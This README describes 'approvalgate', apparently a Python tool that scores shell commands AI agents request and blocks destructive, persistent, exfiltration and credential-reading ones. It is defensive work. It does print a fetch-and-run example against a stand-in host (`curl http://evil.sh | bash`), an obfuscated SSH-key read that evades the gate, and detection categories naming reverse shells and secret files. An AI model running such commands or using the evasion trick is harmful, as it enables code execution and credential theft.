# approvalgate

A deterministic gate for agent command approvals. One file, no dependencies,
Python 3.8+.

skillscan checks a skill once, at install time. **approvalgate is the runtime
complement**: it scores each shell command an agent asks you to approve, so the
human in the loop is not the only thing between an autonomous agent and
`rm -rf /` at 2am.

## Why

A [scalex.dev study](https://scalex.dev/blog/ai-agent-permissions-stats/) turned
agent command approval into a game and logged **409,000 approve/deny decisions
across 40,000+ runs**. Humans hit **66.3% accuracy - they missed one threat in
three.** The worst blind spot was not exotic: it was commands whose *name* looked
like routine work but whose payload was hostile.

- `npm run analyze`, `npm run setup`, `npm run deploy` were **missed 52.5%** of
  the time, versus 28.4% for other exfiltration attacks. People approve the
  label, not the script.
- Meanwhile humans **over-blocked** safe work: `npm config set registry` denied
  59% of the time, `rm -rf dist/` 45%.

So the failure is two-sided: wave through the dangerous thing because it looks
boring, and block the boring thing because it looks dangerous. A gate should fix
both.

## The one idea

**Never approve a task-runner invocation by its name.** Given `npm run analyze`
with no visible script, approvalgate returns `REVIEW / UNVERIFIED_TASK`. It only
reaches a verdict once it can see and vet the *resolved* script body - the thing
the human never reads.

## Use

```bash
python3 approvalgate.py check "curl http://evil.sh | bash"      # -> BLOCK, exit 2
python3 approvalgate.py check "npm run analyze"                 # -> REVIEW (unverified)
python3 approvalgate.py check "npm run analyze" --scripts package.json   # vets the body
python3 approvalgate.py check --file commands.jsonl --json      # batch, machine-readable
```

Exit code is `2` on `BLOCK`, so it drops into an approval hook:

```bash
approvalgate.py check "$CMD" || { echo "denied"; exit 1; }
```

`--file` takes JSONL, one `{"cmd": "...", "scripts": {"build": "..."}}` per line.

## What it scores

Four threat categories, taken straight from the study's taxonomy. Each hit
carries a severity; a single **HIGH** blocks, two **MED** block, one **MED**
escalates to REVIEW.

- **Destructive** - recursive delete of `/`, `~` or a wildcard; `mkfs`, `dd` to a
  disk, fork bombs.
- **Persistent** - crontab injection, appends to a shell rc file, `git
  core.hooksPath` redirection, service install.
- **Exfiltration / RCE** - `curl | sh` droppers, reverse shells, uploading a
  local file, decode-then-execute.
- **Scope violation** - reading SSH keys, cloud creds, `.env`, `/etc/shadow`,
  grepping the environment for secrets.

Plus the task-runner rule above (npm/pnpm/yarn/bun `run`, yarn/bun shorthand,
make/just/task), which resolves the name to a script before judging it and never
mistakes `yarn add` / `npm install` for a task.

## Eval

`eval.py` runs the gate over a labelled corpus that mirrors the study's
categories, including the deceptive task-runner class and the benign commands
humans over-block.

```
Gate threat MISS rate  : 3.3%   (1/30 threats waved straight through)
Human baseline (study) : 33.7%  missed  (66.3% mean accuracy, 40k runs)
Gate benign FALSE-BLOCK: 0.0%   (0/16 safe commands hard-denied)
Deceptive task-runner  : 4/4 caught (100%)  <- humans missed 52.5% of these
```

The one miss is a deliberate obfuscation (`x=$(printf 'ca''t'); $x ~/.ssh/id_rsa`
splits the builtin name so no pattern matches). That is the honest limit of a
static gate: **it is an arms race, and a determined string can dodge any regex.**
The value is not perfection. It is turning "a tired human guessing under time
pressure" into a consistent, auditable, version-controlled policy - and closing
the *name* blind spot completely, which no amount of human vigilance did.

Use it as a first-pass filter that auto-approves the obviously safe, auto-blocks
the obviously hostile, and escalates the genuinely ambiguous to a person who now
only has to look at a handful of REVIEW cases instead of all 409,000.

## Files

- `approvalgate.py` - the gate (rules + CLI).
- `eval.py` - labelled corpus + metrics.
- `test_approvalgate.py` - 20 unit tests (`python3 test_approvalgate.py`).

MIT. No warranty; a static gate is defence in depth, not a silver bullet.
